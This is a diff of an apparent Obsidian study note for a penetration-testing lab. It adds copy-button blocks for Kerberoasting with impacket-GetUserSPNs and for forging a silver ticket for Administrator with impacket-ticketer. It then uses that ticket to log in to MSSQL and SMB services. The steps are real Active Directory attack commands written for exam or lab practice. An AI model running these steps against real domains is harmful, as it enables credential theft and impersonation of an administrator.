@@ -45,7 +45,7 @@ button.style.cssText = `
 button.addEventListener("click", async () => {
     await navigator.clipboard.writeText(command);
     button.textContent = "Copied!";
-    setTimeout(() => button.textContent = command, 1000);
+    setTimeout(() => button.textContent = command, 250);
 });
 ```
 
@@ -71,7 +71,7 @@ button.style.cssText = `
 button.addEventListener("click", async () => {
     await navigator.clipboard.writeText(command);
     button.textContent = "Copied!";
-    setTimeout(() => button.textContent = command, 1000);
+    setTimeout(() => button.textContent = command, 250);
 });
 ```
 
@@ -102,7 +102,33 @@ button.style.cssText = `
 button.addEventListener("click", async () => {
     await navigator.clipboard.writeText(command);
     button.textContent = "Copied!";
-    setTimeout(() => button.textContent = command, 1000);
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+Or from KALI
+```dataviewjs
+const command = `impacket-GetUserSPNs DOMAIN.LOCAL/user:'password' -dc-ip <DC_IP>`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
 });
 ```
 
@@ -132,7 +158,7 @@ button.addEventListener("click", async () => {
     try {
         await navigator.clipboard.writeText(command);
         button.textContent = "Copied!";
-        setTimeout(() => button.textContent = command, 1000);
+        setTimeout(() => button.textContent = command, 250);
     } catch {
         button.textContent = "Copy failed";
     }
@@ -140,7 +166,7 @@ button.addEventListener("click", async () => {
 ```
 
 ---
-### **Step 4 : Use ticketer**
+### **Step 4 : Create Ticket (Ticketer)**
 
 Kali — Impacket
 ```
@@ -149,16 +175,173 @@ impacket-ticketer \
 -domain-sid <DOMAIN_SID> \
 -domain domain.local \
 -spn cifs/FILE01.domain.local \
-Administrator
+-user-id 500 Administrator
 ```
 
 Then:
 
-```
-export KRB5CCNAME=Administrator.ccache
+```dataviewjs
+const command = `
+export KRB5CCNAME=Administrator.ccache`;
 
-impacket-smbclient -k -no-pass \
-domain.local/Administrator@FILE01.domain.local
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+To check whether ticket generated properly
+```dataviewjs
+const command = `klist`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+---
+### **Step 5 : Login with the Ticket**
+
+Login with the respective associated service
+
+SMB > Impacket-smbclient
+MSSQL > Impacket-mssqlclient
+
+Since we forwarded 1433 port to our attack machine, we need to regulate /etc/hosts file according to it.
+
+sudo gedit /etc/hosts
+```dataviewjs
+const command = `240.0.0.1 nagoya.nagoya-industries.com`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+```dataviewjs
+const command = `impacket-mssqlclient -k DC01.oscp.exam`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+or
+```dataviewjs
+const command = `impacket-mssqlclient -debug -k -no-pass -windows-auth nagoya-industries.com/Administrator@nagoya.nagoya-industries.com`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
+```
+
+```dataviewjs
+const command = `impacket-smbclient -k -no-pass \
+domain.local/Administrator@FILE01.domain.local`;
+
+const button = dv.container.createEl("button", {
+    text: command
+});
+
+button.style.cssText = `
+    font-family: monospace;
+    font-size: 0.85em;
+    padding: 2px 6px;
+    border: 1px solid var(--background-modifier-border);
+    border-radius: 4px;
+    background: var(--code-background);
+    color: var(--text-normal);
+    cursor: pointer;
+`;
+
+button.addEventListener("click", async () => {
+    await navigator.clipboard.writeText(command);
+    button.textContent = "Copied!";
+    setTimeout(() => button.textContent = command, 250);
+});
 ```
 
 **Remember:**
